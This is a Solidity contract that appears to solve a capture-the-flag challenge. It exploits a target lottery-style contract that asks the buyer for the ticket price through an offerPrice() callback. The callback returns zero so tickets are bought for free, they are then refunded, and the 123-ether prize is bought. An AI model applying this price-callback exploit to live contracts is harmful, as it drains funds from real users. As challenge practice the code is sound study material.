// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "./SL.sol";
import "./Setup.sol";
contract Solve {

    SL public sl;
    Setup public setup;
    uint256 public bribe = 0;
    bytes32[] public ticketsPurchased;

    receive() external payable {}


    constructor(address sl_addr,address setup_addr) payable {
        sl = SL(sl_addr);
        setup = Setup(setup_addr);
        setup.hello();
    }

    function offerPrice() public view returns (uint256) {
        if(bribe != sl.timesBribed()){
            return 0 ether;
        }
        if(sl.ticketsSold() > sl.maxTickets()){
            return (sl.ticketPrice() * (sl.timesBribed() + 2));
        }
        return sl.ticketPrice();
    }

    function confirmPurchase(bytes32 ticketIdentifier) public{
        ticketsPurchased.push(ticketIdentifier);
    }

    function exploit() public {
        
        for(uint i = 0; i < 100 ;i++){
            uint256 val = offerPrice();
            bribe = sl.timesBribed();
            sl.buyTicket{value: val}();
            if(i==20){
                bribe = 1;
            }
        }
        for(uint i = 0; i < 100 ;i++){
            sl.refundTicket(ticketsPurchased[i]);
        }
    }

    function win() public {
        
        sl.buySL{value: 123 ether}();
        setup.isSolved();

    }

    function size() public view returns (uint) {
        return ticketsPurchased.length;
    }


}
